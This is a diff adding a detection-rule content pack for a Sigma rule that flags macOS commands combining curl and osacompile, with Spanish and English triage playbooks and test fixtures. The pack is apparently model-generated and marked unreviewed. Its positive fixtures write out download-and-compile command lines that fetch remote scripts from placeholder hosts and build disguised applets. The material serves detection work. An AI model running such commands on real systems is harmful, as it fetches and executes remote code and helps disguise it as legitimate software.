@@ -1,0 +1,127 @@
+{
+  "rule": {
+    "id": "13db8d2e-7723-4c2c-93c1-a4d36994f7ef",
+    "title": "Potential In-Memory Download And Compile Of Payloads",
+    "level": "medium",
+    "status": "test",
+    "author": "Sohan G (D4rkCiph3r), Red Canary (idea)",
+    "path": "macos/process_creation/proc_creation_macos_susp_in_memory_download_and_compile.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/macos/process_creation/proc_creation_macos_susp_in_memory_download_and_compile.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.007",
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "La línea de comandos de un proceso en macOS incluyó a la vez curl y osacompile. Probablemente se descargó un script y se compiló como applet de AppleScript o JXA en un solo comando, sin guardarlo antes en disco, una técnica usada por el malware XCSSET.",
+      "what_it_detects": "Eventos de creación de procesos en macOS cuyo CommandLine contiene tanto 'osacompile' como 'curl', por ejemplo osacompile -e \"$(curl ...)\" o curl ... | osacompile -o <applet>.app.",
+      "why_it_matters": "Un atacante puede descargar un payload remoto (T1105, Ingress Tool Transfer) y convertirlo de inmediato en un applet AppleScript/JavaScript ejecutable (T1059.007). Así ejecuta código, logra persistencia o suplanta aplicaciones legítimas.",
+      "triage_steps": [
+        "Revise el CommandLine completo. Extraiga la URL o el dominio de curl y, de osacompile, la ruta de salida (-o), el lenguaje (-l) y cualquier script en línea con -e.",
+        "Revise Image y ParentImage. Determine si el comando lo lanzó un shell, una fase de build de Xcode, un LaunchAgent o un binario desconocido.",
+        "Verifique el usuario y si esa persona suele escribir AppleScript o usar herramientas de automatización.",
+        "Busque el dominio o la IP de curl en los logs de proxy y DNS y en threat intel. Identifique otros equipos que lo contactaron.",
+        "Examine el .app generado: fecha de creación, hash, firma de código, Info.plist y contenido de main.scpt.",
+        "En el mismo host, en +/- 15 minutos, busque osascript u open ejecutando el applet, LaunchAgents nuevos y proyectos de Xcode modificados.",
+        "Busque alertas previas del mismo host y usuario, y el mismo patrón de CommandLine en otros endpoints."
+      ],
+      "false_positives": [
+        "La regla no indica falsos positivos conocidos. Se esperan muy pocos casos legítimos.",
+        "Scripts de administradores o desarrolladores que descargan un AppleScript de un repositorio interno y lo compilan durante un despliegue.",
+        "Instaladores o flujos de MDM que generan applets auxiliares a partir de scripts alojados en servidores remotos."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del equipo si el comando era esperado. Preserve el script descargado, el applet compilado y el árbol de procesos.",
+        "Si es malicioso, aísle el endpoint desde el EDR y bloquee el dominio o la IP de curl en el proxy y el DNS.",
+        "Elimine el applet y cualquier LaunchAgent, LaunchDaemon o proyecto de Xcode alterado, después de hacer copias forenses.",
+        "Rote las credenciales y sesiones del navegador expuestas en el equipo. Luego busque los mismos indicadores en toda la flota."
+      ],
+      "severity_rationale": "Nivel medio: la combinación de curl y osacompile es inusual y sospechosa, pero por sí sola no prueba ejecución ni compromiso, así que el analista debe confirmar la intención."
+    },
+    "en": {
+      "summary": "A macOS process command line contained both curl and osacompile. The likely meaning is that a script was downloaded and compiled into an AppleScript or JXA applet in one command, without being saved to disk first. XCSSET malware uses this pattern.",
+      "what_it_detects": "macOS process creation events where CommandLine contains both 'osacompile' and 'curl', for example osacompile -e \"$(curl ...)\" or curl ... | osacompile -o <applet>.app.",
+      "why_it_matters": "Attackers can fetch a remote payload (T1105, Ingress Tool Transfer) and turn it straight into a runnable AppleScript/JavaScript applet (T1059.007). The applet can then run code, persist or pose as a real app.",
+      "triage_steps": [
+        "Read the full CommandLine. Extract the curl URL or domain and the osacompile output path (-o), language (-l) and any inline -e script.",
+        "Review Image and ParentImage. Find out whether a shell, Xcode build phase, LaunchAgent or unknown binary started the command.",
+        "Check the user account and whether that user normally writes AppleScript or uses automation tools.",
+        "Look up the curl domain or IP in proxy and DNS logs and threat intel. Find other hosts that contacted it.",
+        "Check the output .app on disk: creation time, hash, code signature, Info.plist and main.scpt contents.",
+        "On the same host within +/- 15 minutes, look for osascript or open launching the applet, new LaunchAgents and modified Xcode projects.",
+        "Search for earlier alerts on this host and user, and for the same CommandLine pattern on other endpoints."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives. Expect very few legitimate cases.",
+        "Admin or developer scripts that download an AppleScript from an internal repository and compile it during deployment.",
+        "Software installers or MDM workflows that build helper applets from remotely hosted scripts."
+      ],
+      "response_steps": [
+        "Confirm with the user or asset owner whether the command was expected. Preserve the downloaded script, the compiled applet and the process tree.",
+        "If it is malicious, isolate the endpoint through EDR and block the curl domain or IP at the proxy and DNS layers.",
+        "Remove the compiled applet and any related LaunchAgents, LaunchDaemons or tampered Xcode projects, after taking forensic copies.",
+        "Rotate credentials and browser sessions that were exposed on the host. Then hunt across the fleet for the same indicators."
+      ],
+      "severity_rationale": "Medium fits: combining curl and osacompile is rare and suspicious, but on its own it does not prove execution or compromise, so the analyst must confirm intent."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "zsh runs osacompile on a script fetched in memory with curl and writes a disguised applet (XCSSET-style).",
+        "event": {
+          "Image": "/bin/zsh",
+          "CommandLine": "/bin/zsh -c osacompile -e \"$(curl -fsSL https://update.example.com/a.scpt)\" -o /Users/jperez/Library/Caches/com.apple.updater.app",
+          "ParentImage": "/usr/bin/xcodebuild",
+          "User": "jperez",
+          "ProcessId": 4127,
+          "Computer": "MAC-0142"
+        }
+      },
+      {
+        "description": "bash pipes a JavaScript payload downloaded with curl straight into osacompile to build a JXA applet.",
+        "event": {
+          "Image": "/bin/bash",
+          "CommandLine": "bash -c curl -s https://cdn.example.org/s.js | osacompile -l JavaScript -o /tmp/.s.app",
+          "ParentImage": "/bin/launchd",
+          "User": "mlopez",
+          "ProcessId": 5310,
+          "Computer": "MAC-0207"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "A developer compiles a local AppleScript file with osacompile. No curl is involved.",
+        "event": {
+          "Image": "/usr/bin/osacompile",
+          "CommandLine": "/usr/bin/osacompile -o /Users/mlopez/Applications/Backup.app /Users/mlopez/Scripts/backup.applescript",
+          "ParentImage": "/bin/zsh",
+          "User": "mlopez",
+          "ProcessId": 6021,
+          "Computer": "MAC-0207"
+        }
+      },
+      {
+        "description": "curl downloads a script to disk without osacompile, so only one of the two required strings is present.",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -fsSL -o /tmp/install.sh https://downloads.example.com/install.sh",
+          "ParentImage": "/bin/zsh",
+          "User": "jperez",
+          "ProcessId": 4380,
+          "Computer": "MAC-0142"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
